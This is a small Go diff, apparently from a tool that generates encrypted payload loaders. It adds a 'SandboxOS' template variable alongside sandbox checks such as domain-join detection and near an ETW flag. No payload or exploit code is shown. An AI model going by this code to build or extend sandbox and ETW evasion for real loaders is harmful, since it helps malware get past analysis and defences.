@@ -694,6 +694,7 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	}
 
 	if sandbox == true {
+		Binary.Variables["SandboxOS"] = `"os"`
 		Binary.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(4, 12)
 		Binary.Variables["domain"] = Cryptor.VarNumberLength(4, 12)
 		Binary.Variables["status"] = Cryptor.VarNumberLength(4, 12)
@@ -720,6 +721,7 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 		Binary.Variables["Sandbox"] = ""
 		Binary.Variables["Sandboxfunction"] = ""
 		Binary.Variables["SandboxImport"] = ""
+		Binary.Variables["SandboxOS"] = ""
 	}
 
 	if ETW == false {
